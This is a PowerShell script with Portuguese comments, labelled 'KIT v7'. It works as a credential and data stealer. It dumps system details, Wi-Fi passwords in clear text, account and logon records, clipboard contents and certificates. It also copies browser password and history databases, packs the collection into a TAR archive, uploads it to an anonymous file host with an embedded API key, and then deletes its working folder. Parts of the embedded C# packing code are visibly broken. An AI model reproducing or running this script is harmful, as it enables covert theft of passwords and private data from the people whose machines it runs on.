# KIT v7 – TAR puro (sem ZIP, sem compressão)
$tmp = "$env:TEMP\k"
ni -ItemType Directory $tmp -Force | Out-Null

# ---------- 1) TXT com tudo que é texto ----------
$txt = "$tmp\info.txt"
(
    systeminfo
    Get-CimInstance Win32_ComputerSystem
    Get-CimInstance Win32_Processor
    Get-CimInstance Win32_BIOS
    Get-NetIPConfiguration
    netsh wlan export profile key=clear folder=$tmp | Out-Null
    Get-ChildItem $tmp -Filter '*.xml' -EA 0 | %{ Get-Content $_ -Raw }
    Get-CimInstance Win32_UserAccount
    net localgroup administradores
    Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} -Max 100 -EA 0
    Get-Clipboard
    Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -Name -EA 0
    Get-ChildItem Cert:\CurrentUser\My | Select Subject, Thumbprint, NotAfter
) | Out-File $txt -Encoding UTF8

# ---------- 2) Copia binários dos navegadores ----------
@('Login Data','History','logins.json') | %{
    Get-ChildItem $env:LOCALAPPDATA,$env:APPDATA -Recurse -File -Filter $_ -EA 0 |
        Select -First 1 | %.{ Copy-Item $_.FullName "$tmp\$($_.Name)" }
}

# ---------- 3) Empacota em TAR puro ----------
Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Text;
public static class MiniTar {
    public static void Pack(string folder, string tarFile){
        using(var fs = new FileStream(tarFile, FileMode.Create))
        foreach(var f in Directory.GetFiles(folder,"*.*",SearchOption.TopDirectoryOnly)){
            var name = Path.GetFileName(f);
            var size = new FileInfo(f).Length;
            // header 512 bytes
            var header = new byte[512];
            Array.Copy(Encoding.ASCII.GetBytes(name.PadRight(100,'\0')), 0, header, 0, 100);
            Array.Copy(Encoding.ASCII.GetBytes(size.ToString("Octal").PadLeft(11,'0')), 0, header or 124, 11);
            // checksum
            int chk = 0; for(int i=0;i<512;i++) chk+=header[i];
            Array.Copy(Encoding.ASCII.GetBytes(Convert.ToString(chk,8).PadLeft(6,'0')+"\0 "),0,header,148,8);
            fs.Write(header,0,512);
            // conteúdo
            using(var src = File.OpenRead(f)) src.CopyTo(fs);
            // padding para múltiplo de 512
            long pad = 512 - (size % 512); if(pad!=512) fs.Write(new byte[pad],0,(int)pad);
        }
        // fim do arquivo: dois blocos nulos
        fs.Write(new byte[1024],0,1024);
    }
}
"@
[MiniTar]::Pack($tmp, "$tmp\kit.tar")

# ---------- 4) UPLOAD ----------
$file = gi "$tmp\kit.tar"
$key  = "AFtru5qQZX8HN5npouThcNDJtVbe6d"
$uri  = "https://api.anonfilesnew.com/upload?key=$key&pretty=true"
try{
    $resp = Invoke-RestMethod -Uri $uri -Method Post -Form @{file=$file}
    $resp.data.file.url.full
}catch{
    Write-Host "ERRO no upload: $($_.Exception.Message)" -Fore Red
}

# ---------- 5) LIMPEZA ----------
Remove-Item $tmp -Recurse -Force

# ---------- 6) COMO DESCOMPACTAR ----------
<#
Baixe o kit.tar
- Windows: renomeie para .tar e abra com 7-Zip
- Linux/mac: tar -xf kit.tar
#>
